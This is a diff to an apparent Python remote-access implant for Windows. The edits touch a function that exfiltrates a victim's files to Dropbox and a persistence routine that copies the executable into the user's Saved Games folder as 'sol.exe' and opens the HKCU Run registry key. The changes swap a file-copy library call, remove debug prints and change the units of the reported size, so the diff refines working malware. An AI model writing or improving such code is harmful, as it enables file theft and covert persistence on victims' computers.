@@ -1,5 +1,5 @@
 from winreg import *
-from win32api import CopyFile
+from shutil import copyfile
 import requests
 import os
 import dropbox
@@ -77,8 +77,6 @@ def exfilFiles():
     exfilThread = threading.Thread(target=afterInfo, args=())
     exfilThread.daemon = True
     exfilThread.start()
-    print (eTotalSize)
-    print(eTotalSize/1e+9)
 
     return ('''
     [+] Exfilling Data to Dropbox  [+] 
@@ -86,7 +84,7 @@ def exfilFiles():
     Total number of files: %s
     Total size: %sGB
     
-    ''' % (eTotalFiles, eTotalSize/1e+9))
+    ''' % (eTotalFiles, eTotalSize/1e+6))
 #---------------------END EXFILTRATION---------------------------------------
 
 def executeBackground(command):
@@ -132,7 +130,7 @@ def exec_persist():
     filedrop = r'%s\Saved Games\%s' % (os.path.expandvars("%userprofile%"), 'sol.exe')
     currentExecutable = sys.executable
     try:
-        CopyFile(currentExecutable, filedrop, 0)
+        copyfile(currentExecutable, filedrop)
 
         keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
         key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
